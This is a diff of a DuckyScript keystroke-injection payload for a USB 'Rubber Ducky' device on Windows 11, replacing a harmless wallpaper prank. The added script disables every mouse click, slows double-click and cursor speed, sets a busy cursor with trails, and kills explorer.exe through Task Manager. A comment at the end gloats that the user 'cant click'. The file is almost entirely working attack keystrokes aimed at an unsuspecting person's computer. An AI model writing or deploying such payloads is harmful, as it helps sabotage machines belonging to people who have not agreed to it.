@@ -1,102 +1,83 @@
-REM AUTHOR: DANNY DIEP
-REM This payload runs on WINDOWS 11 
-REM The next four lines open Notepad in Windows and type "Hello World!"
-DELAY 3000
-GUI r
-DELAY 1000
-STRING notepad
-DELAY 1000
+GUI d
+CONTROL ESCAPE
+STRING mouse
+REM this is opening up the mouse config.
 ENTER
-DELAY 1000
-STRING Hello World!
+STRING n
+TAB
+STRING n
+TAB
+STRING n
+REM this set all of there mouse clicks to nothing (user cant click :D)
+TAB
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+REM this makes the double click speed area the slowest
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+RIGHTARROW
+REM this switches over to the "pointers"
+TAB
+STRING w
+TAB
+TAB
+STRING b
+REM changes the cursor look to busy 
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+RIGHTARROW
+TAB
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+REM makes there "busy" cursor go as slow as possible
+STRING d
+STRING s
+REM makes the cursor have a "trail" and if ctrl+clicked a "location"
+STRING a
 ENTER
-STRING I will make your desktop look better!!!
-
-REM Open the picture in the default web browser
-DELAY 3000
-GUI r
-DELAY 100
-STRING http://www.thecuriosityworkshop.com/wp-content/uploads/2015/03/01-rubberduck-hongkong.jpg
-DELAY 100
+GUI
+STRING task manager
+TAB
+TAB
+TAB
+TAB
+TAB
+RIGHTARROW
+TAB
+STRING explorer
+TAB
+STRING e
 ENTER
-DELAY 500
-REM Save the picture to the desktop and name it as QUACKED
-CTRL s
-DELAY 500
-STRING %userprofile%\Desktop\DUCKY
-ENTER
-DELAY 3000
-
-REM Open the picture using the default photo application 
-GUI r
-DELAY 100
-STRING cmd
-ENTER
-DELAY 100
-STRING cd %userprofile%\Desktop\
-ENTER
-REM Wait for the picture to download before open it
-DELAY 3000
-STRING DUCKY.jpg
-DELAY 100
-ENTER
-
-REM Using tab to go through the menu
-REM TAB count: 12
-DELAY 200
-TAB
-DELAY 200
-TAB
-DELAY 200
-TAB
-DELAY 200
-TAB
-DELAY 200
-TAB
-DELAY 200
-TAB
-DELAY 200
-TAB
-DELAY 200
-TAB
-DELAY 200
-TAB
-DELAY 200
-TAB
-DELAY 200
-TAB
-DELAY 200
-TAB
-
-REM Open the setting menu of the app
-REM DOWN arrow count: 5
-DELAY 200
-ENTER
-DELAY 200
-DOWNARROW
-DELAY 200
-DOWNARROW
-DELAY 200
-DOWNARROW
-DELAY 200
-DOWNARROW
-DELAY 200
-DOWNARROW
-DELAY 200
-ENTER
-DELAY 200
-ENTER
-
-REM Exiting the programs
-DELAY 200
-ALT F4
-DELAY 200
-ALT F4
-DELAY 200
-ALT F4
-DELAY 200
-ALT F4
-DELAY 200
-TAB
-DELAY 200
-ENTER
+REM This open taskmanager, and turns of explorer (this runs windows) to get back on just ctrl+alt+dlt and goto processes and start "explorer.exe" without ""
+REM Enjoy, ps if this has errors please let me know, email at Calebhutch@yahoo.com thanks :D
